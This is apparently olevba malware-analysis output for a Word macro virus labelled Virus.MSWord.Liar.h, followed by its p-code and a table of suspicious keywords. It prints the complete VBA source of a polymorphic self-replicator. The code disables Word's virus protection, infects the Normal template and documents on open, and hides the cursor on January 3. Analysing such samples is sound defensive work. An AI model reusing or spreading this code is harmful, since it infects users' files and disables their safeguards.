olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer '
Private Sub Document_Open() '
On Error Resume Next '
Dim Gp58(235): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set Ei10 = MacroContainer.VBProject: Set Mw61 = Ei10.VBComponents(1) '
Set Rs34 = Mw61.CodeModule: Set Le27 = NormalTemplate: Fy88 = Chr(39) '
If MacroContainer = Le27 Then Set Le27 = ActiveDocument '
Set Hx60 = Le27.VBProject.VBComponents(1).CodeModule: Dz75 = Rs34.CountOfLines: Pz27 = 150 + Int(Rnd * 50) '
For Rm50 = 1 To Dz75: Me13 = "": Uo82 = Int(Rnd * 3): Rl47 = InStr(Rs34.Lines(Rm50, 1), Fy88) '
If Rl47 = 1 And Dz75 > Pz27 Then '
Uo82 = 1: GoTo Me23 '
End If '
Mw70 = Left(Rs34.Lines(Rm50, 1), (Rl47 - 1)) '
Gp58(Rm50) = Gp58(Rm50) & Mw70 '
For Ki92 = 1 To Int(75 - Int(Rnd * 20)): Me13 = Me13 & Chr(255 - Int(Rnd * 100)): Next Ki92 '
Gp58(Rm50) = Gp58(Rm50) & Fy88 & Me13 '
If Uo82 = 2 Then Gp58(Rm50) = Gp58(Rm50) & vbCr & Fy88 & Me13 '
Hy57 = Hy57 & Gp58(Rm50) & vbCr '
Me23: '
Next Rm50 '
Dim Sl82(1 To 23) '
Sl82(1) = "Hy57": Sl82(2) = "Sl82": Sl82(3) = "Sk52": Sl82(4) = "Ow43": Sl82(5) = "Pl68": Sl82(6) = "Vx99" '
Sl82(7) = "Gp58": Sl82(8) = "Ei10": Sl82(9) = "Mw61": Sl82(10) = "Rs34": Sl82(11) = "Le27": Sl82(12) = "Fy88" '
Sl82(13) = "Hx60": Sl82(14) = "Dz75": Sl82(15) = "Pz27": Sl82(16) = "Rm50": Sl82(17) = "Me13": Sl82(18) = "Uo82" '
Sl82(19) = "Rl47": Sl82(20) = "Me23": Sl82(21) = "Mw70": Sl82(22) = "Ki92": Sl82(23) = "Hy57" '
For Sk52 = 1 To 23 '
Ow43 = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 99999) '
Vx99 = 1 '
Pl68: '
Vx99 = InStr(Vx99, Hy57, Sl82(Sk52)) '
If Vx99 <> 0 Then Hy57 = Mid(Hy57, 1, (Vx99 - 1)) & Ow43 & Mid(Hy57, (Vx99 + Len(Sl82(Sk52))), Len(Hy57)): GoTo Pl68 '
Next Sk52 '
If Hx60.CountOfLines < (0 + 2) Then '
Hx60.DeleteLines 1, Hx60.CountOfLines: Hx60.AddFromString Hy57 '
If Le27 = ActiveDocument Then ActiveDocument.SaveAs (ActiveDocument.FullName) '
End If '
If Day(Now()) = 3 And Month(Now()) = 1 Then '
MsgBox "the only way to be free is to start a revolution or to die...", 64, "Class.Angel | -jackie twoflower/Lz0NT/MVT-" '
While ShowCursor(False) >= 0 '
Wend '
End If '
End Sub '
Rem "Thats why I am easy...easy like sunday morning" -jackie twoflower- '
Rem Class.Angel uses PiE in combination with PVP by jackie twoflower '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Liar.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7830 bytes
' Line #0:
' 	FuncDefn (Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer)
' 	QuoteRem 0x0055 0x0000 ""
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' 	QuoteRem 0x001C 0x0000 ""
' Line #2:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0000 ""
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00EB 
' 	VarDefn Gp58
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0059 0x0000 ""
' Line #4:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set Ei10 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Ei10 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set Mw61 
' 	QuoteRem 0x0045 0x0000 ""
' Line #5:
' 	SetStmt 
' 	Ld Mw61 
' 	MemLd CodeModule 
' 	Set Rs34 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Le27 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St Fy88 
' 	QuoteRem 0x0046 0x0000 ""
' Line #6:
' 	Ld MacroContainer 
' 	Ld Le27 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Le27 
' 	EndIf 
' 	QuoteRem 0x0038 0x0000 ""
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Le27 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Hx60 
' 	BoS 0x0000 
' 	Ld Rs34 
' 	MemLd CountOfLines 
' 	St Dz75 
' 	BoS 0x0000 
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St Pz27 
' 	QuoteRem 0x006B 0x0000 ""
' Line #8:
' 	StartForVariable 
' 	Ld Rm50 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Dz75 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St Me13 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St Uo82 
' 	BoS 0x0000 
' 	Ld Rm50 
' 	LitDI2 0x0001 
' 	Ld Rs34 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Fy88 
' 	FnInStr 
' 	St Rl47 
' 	QuoteRem 0x005E 0x0000 ""
' Line #9:
' 	Ld Rl47 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Dz75 
' 	Ld Pz27 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0021 0x0000 ""
' Line #10:
' 	LitDI2 0x0001 
' 	St Uo82 
' 	BoS 0x0000 
' 	GoTo Me23 
' 	QuoteRem 0x0014 0x0000 ""
' Line #11:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #12:
' 	Ld Rm50 
' 	LitDI2 0x0001 
' 	Ld Rs34 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Rl47 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	St Mw70 
' 	QuoteRem 0x002D 0x0000 ""
' Line #13:
' 	Ld Rm50 
' 	ArgsLd Gp58 0x0001 
' 	Ld Mw70 
' 	Concat 
' 	Ld Rm50 
' 	ArgsSt Gp58 0x0001 
' 	QuoteRem 0x001F 0x0000 ""
' Line #14:
' 	StartForVariable 
' 	Ld Ki92 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld Me13 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Me13 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Ki92 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x005C 0x0000 ""
' Line #15:
' 	Ld Rm50 
' 	ArgsLd Gp58 0x0001 
' 	Ld Fy88 
' 	Concat 
' 	Ld Me13 
' 	Concat 
' 	Ld Rm50 
' 	ArgsSt Gp58 0x0001 
' 	QuoteRem 0x0026 0x0000 ""
' Line #16:
' 	Ld Uo82 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Rm50 
' 	ArgsLd Gp58 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld Fy88 
' 	Concat 
' 	Ld Me13 
' 	Concat 
' 	Ld Rm50 
' 	ArgsSt Gp58 0x0001 
' 	EndIf 
' 	QuoteRem 0x003E 0x0000 ""
' Line #17:
' 	Ld Hy57 
' 	Ld Rm50 
' 	ArgsLd Gp58 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Hy57 
' 	QuoteRem 0x0020 0x0000 ""
' Line #18:
' 	Label Me23 
' 	QuoteRem 0x0006 0x0000 ""
' Line #19:
' 	StartForVariable 
' 	Ld Rm50 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0000 ""
' Line #20:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0017 
' 	VarDefn Sl82
' 	QuoteRem 0x0012 0x0000 ""
' Line #21:
' 	LitStr 0x0004 "Hy57"
' 	LitDI2 0x0001 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Sl82"
' 	LitDI2 0x0002 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Sk52"
' 	LitDI2 0x0003 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Ow43"
' 	LitDI2 0x0004 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Pl68"
' 	LitDI2 0x0005 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Vx99"
' 	LitDI2 0x0006 
' 	ArgsSt Sl82 0x0001 
' 	QuoteRem 0x006B 0x0000 ""
' Line #22:
' 	LitStr 0x0004 "Gp58"
' 	LitDI2 0x0007 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Ei10"
' 	LitDI2 0x0008 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Mw61"
' 	LitDI2 0x0009 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Rs34"
' 	LitDI2 0x000A 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Le27"
' 	LitDI2 0x000B 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Fy88"
' 	LitDI2 0x000C 
' 	ArgsSt Sl82 0x0001 
' 	QuoteRem 0x006E 0x0000 ""
' Line #23:
' 	LitStr 0x0004 "Hx60"
' 	LitDI2 0x000D 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Dz75"
' 	LitDI2 0x000E 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Pz27"
' 	LitDI2 0x000F 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Rm50"
' 	LitDI2 0x0010 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Me13"
' 	LitDI2 0x0011 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Uo82"
' 	LitDI2 0x0012 
' 	ArgsSt Sl82 0x0001 
' 	QuoteRem 0x0071 0x0000 ""
' Line #24:
' 	LitStr 0x0004 "Rl47"
' 	LitDI2 0x0013 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Me23"
' 	LitDI2 0x0014 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Mw70"
' 	LitDI2 0x0015 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Ki92"
' 	LitDI2 0x0016 
' 	ArgsSt Sl82 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "Hy57"
' 	LitDI2 0x0017 
' 	ArgsSt Sl82 0x0001 
' 	QuoteRem 0x005E 0x0000 ""
' Line #25:
' 	StartForVariable 
' 	Ld Sk52 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0017 
' 	For 
' 	QuoteRem 0x0013 0x0000 ""
' Line #26:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI4 0x869F 0x0001 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Ow43 
' 	QuoteRem 0x004D 0x0000 ""
' Line #27:
' 	LitDI2 0x0001 
' 	St Vx99 
' 	QuoteRem 0x0009 0x0000 ""
' Line #28:
' 	Label Pl68 
' 	QuoteRem 0x0006 0x0000 ""
' Line #29:
' 	Ld Vx99 
' 	Ld Hy57 
' 	Ld Sk52 
' 	ArgsLd Sl82 0x0001 
' 	FnInStr3 
' 	St Vx99 
' 	QuoteRem 0x0025 0x0000 ""
' Line #30:
' 	Ld Vx99 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Hy57 
' 	LitDI2 0x0001 
' 	Ld Vx99 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Ow43 
' 	Concat 
' 	Ld Hy57 
' 	Ld Vx99 
' 	Ld Sk52 
' 	ArgsLd Sl82 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld Hy57 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Hy57 
' 	BoS 0x0000 
' 	GoTo Pl68 
' 	EndIf 
' 	QuoteRem 0x0075 0x0000 ""
' Line #31:
' 	StartForVariable 
' 	Ld Sk52 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0000 ""
' Line #32:
' 	Ld Hx60 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0024 0x0000 ""
' Line #33:
' 	LitDI2 0x0001 
' 	Ld Hx60 
' 	MemLd CountOfLines 
' 	Ld Hx60 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld Hy57 
' 	Ld Hx60 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x003F 0x0000 ""
' Line #34:
' 	Ld Le27 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' 	QuoteRem 0x004E 0x0000 ""
' Line #35:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #36:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x002C 0x0000 ""
' Line #37:
' 	LitStr 0x003D "the only way to be free is to start a revolution or to die..."
' 	LitDI2 0x0040 
' 	LitStr 0x002A "Class.Angel | -jackie twoflower/Lz0NT/MVT-"
' 	ArgsCall MsgBox 0x0003 
' 	QuoteRem 0x0079 0x0000 ""
' Line #38:
' 	LitVarSpecial (False)
' 	ArgsLd ShowCursor 0x0001 
' 	LitDI2 0x0000 
' 	Ge 
' 	While 
' 	QuoteRem 0x001D 0x0000 ""
' Line #39:
' 	Wend 
' 	QuoteRem 0x0005 0x0000 ""
' Line #40:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #41:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #42:
' 	Rem 0x0046 " "Thats why I am easy...easy like sunday morning" -jackie twoflower- '"
' Line #43:
' 	Rem 0x0043 " Class.Angel uses PiE in combination with PVP by jackie twoflower '"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |J_6                 |Sl82                                         |
|String    |                    |                                             |
|Base64    |JNv                 |Sk52                                         |
|String    |                    |                                             |
|Base64    |Fnt                 |Rm50                                         |
|String    |                    |                                             |
|Base64    |F^;                 |Rl47                                         |
|String    |                    |                                             |
|Base64    |*/v                 |Ki92                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

